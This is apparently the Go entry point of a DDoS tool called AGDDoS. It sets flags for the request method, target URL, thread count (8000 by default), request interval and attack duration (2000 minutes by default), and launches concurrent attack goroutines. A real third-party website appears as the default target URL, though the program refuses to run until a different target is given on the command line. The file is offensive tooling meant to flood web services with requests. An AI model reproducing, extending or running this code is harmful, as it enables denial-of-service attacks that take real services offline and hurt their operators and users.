package main

import (
	"flag"
	"log"
	"os"
	"runtime"
	"time"
)

// X args
var (
	timestamp = "unknown"
	version   = "unknown"
)

// Main Function / 主函数
func main() {
	defaultTargetUrl := "https://kzkt.tianyuyun.com/static/h5_new_4.6.5.115/index.html"
	printWelcome()
	SetupCloseHandler()
	runtime.GC() // Clean up memory to prevent memory overflow
	// Parse Flags / 解析命令行参数
	printVersion := flag.Bool("v", false, "Print version and exit")
	flag.StringVar(&Method, "m", "GET", "DDoS Method(GET/POST/PUT/HEAD/...)")
	flag.StringVar(&TargetUrl, "u", defaultTargetUrl, "Taget URL")
	flag.IntVar(&ConcurrencyCount, "cc", 8000, "Number of concurrent threads")
	flag.IntVar(&IntervalMillisecond, "ims", 100, "Frequency of attacks per thread(ms)")
	flag.IntVar(&DurationMinute, "dm", 2000, "Attack Duration time(Minutes)")
	flag.Parse()

	if *printVersion {
		printVer()
		os.Exit(0)
	}

	if TargetUrl == defaultTargetUrl {
		log.Printf("TargetUrl is %s. Please try to start by retransmitting parameters from the command line (TargetUrl != defaultTargetUrl). Usage：./AGDDoS -h\n", TargetUrl)
		return
	}
	go func() {
		for i := 0; i < ConcurrencyCount; i++ {
			go DoAttacking(i)
		}
	}()
	time.Sleep(time.Duration(DurationMinute) * time.Minute)
	os.Exit(0) // Exit with code 0
}
